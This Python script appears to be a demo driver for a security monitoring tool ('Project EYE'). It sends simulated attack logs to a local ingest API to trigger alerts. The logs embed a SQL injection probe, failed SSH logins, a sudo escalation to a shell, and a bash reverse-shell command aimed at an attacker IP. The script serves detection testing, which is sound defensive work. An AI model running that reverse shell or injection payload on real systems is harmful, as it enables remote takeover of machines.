import asyncio
import os
import sys
import time
import httpx

API_BASE = os.getenv("EYE_API_URL", "http://127.0.0.1:8000/api/v1")

async def send_log(client: httpx.AsyncClient, source: str, raw_log: str, host: str, delay: float = 0.5):
    payload = {"source": source, "raw_log": raw_log, "host": host}
    try:
        resp = await client.post(f"{API_BASE}/events/ingest", json=payload, timeout=5.0)
        data = resp.json()
        alerts = data.get("alerts_generated", 0)
        print(f"[{source.upper()}] Sent log -> Event ID: {data.get('event_id')} | Alerts: {alerts}")
        if alerts > 0:
            for alt in data.get("alerts", []):
                print(f"   [ALERT] TRIGGERED: {alt.get('rule_name')} (Severity: {alt.get('severity')})")
    except Exception as e:
        print(f"[!] Request error: {e}")
    await asyncio.sleep(delay)

async def simulate_attack_chain():
    print("="*65)
    print("  PROJECT EYE -- LIVE CYBER ATTACK SIMULATION ENGINE")
    print("="*65)
    print("  Target Server:   api-gateway-01")
    print("  Attacker IP:     203.0.113.99")
    print("="*65 + "\n")

    async with httpx.AsyncClient() as client:
        # Phase 1: Web SQL Injection Reconnaissance
        print("[*] PHASE 1: Web Application SQL Injection Probe...")
        await send_log(
            client,
            "nginx",
            '203.0.113.99 - - [18/Aug/2026:21:00:01 +0000] "GET /login?user=admin\'%20UNION%20SELECT%201,version()-- HTTP/1.1" 403 210 "-" "Mozilla/5.0"',
            "api-gateway-01",
            delay=1.0
        )

        # Phase 2: Rapid SSH Brute Force (5 attempts)
        print("\n[*] PHASE 2: SSH Brute Force Password Spray...")
        for user in ["admin", "root", "devops", "deploy", "ubuntu"]:
            log_str = f"Aug 18 21:00:10 api-gateway-01 sshd[9012]: Failed password for invalid user {user} from 203.0.113.99 port 51902 ssh2"
            await send_log(client, "linux-auth", log_str, "api-gateway-01", delay=0.4)

        # Phase 3: Sudo Privilege Escalation
        print("\n[*] PHASE 3: Sudo Privilege Escalation Attempt...")
        sudo_log = "Aug 18 21:00:25 api-gateway-01 sudo: ubuntu : TTY=pts/2 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/sh"
        await send_log(client, "linux-auth", sudo_log, "api-gateway-01", delay=1.0)

        # Phase 4: Reverse Shell Spawn
        print("\n[*] PHASE 4: Suspicious Reverse Shell Process Execution...")
        shell_log = '{"host":"api-gateway-01","process":"/bin/bash -i >& /dev/tcp/203.0.113.99/4444 0>&1","pid":10492,"user":"root","event_type":"suspicious_process","severity":"critical"}'
        await send_log(client, "custom", shell_log, "api-gateway-01", delay=1.0)

    print("\n" + "="*65)
    print(" [SUCCESS] ATTACK CHAIN SIMULATION FINISHED!")
    print(" Check your Project EYE Web Dashboard to see real-time alerts & incidents.")
    print("="*65)

if __name__ == "__main__":
    asyncio.run(simulate_attack_chain())
